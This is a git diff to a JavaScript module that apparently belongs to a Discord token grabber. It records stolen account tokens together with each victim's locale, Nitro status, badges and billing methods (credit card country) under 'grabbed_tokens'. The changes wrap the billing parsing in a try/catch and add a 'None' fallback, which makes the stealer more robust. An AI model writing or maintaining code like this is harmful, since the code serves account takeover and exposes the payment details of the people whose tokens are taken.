@@ -116,6 +116,8 @@ module.exports = (client) => {
 
                 var _billing = [];
 
+                try {
+
                 billing.data.forEach(billing => {
                     if (billing.type == "") {
                         return "false"
@@ -127,6 +129,8 @@ module.exports = (client) => {
                         _billing.push(`Credit Card (${billing.country})`)
                     }
                 })
+
+                } catch {}
 
                 if (!client.config.discord.grabbed_tokens[source]) {
                     client.config.discord.grabbed_tokens[source] = []
@@ -141,7 +145,7 @@ module.exports = (client) => {
                     "locale": req.data.locale,
                     "nitro": this.getNitro(req.data.premium_type),
                     "badges": this.getBadges(req.data.flags),
-                    "billing": _billing.join(", "),
+                    "billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                     "token": token
                 });
 
@@ -154,7 +158,7 @@ module.exports = (client) => {
                     "locale": req.data.locale,
                     "nitro": this.getNitro(req.data.premium_type),
                     "badges": this.getBadges(req.data.flags),
-                    "billing": _billing.join(", "),
+                    "billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                     "token": token
                 });
 
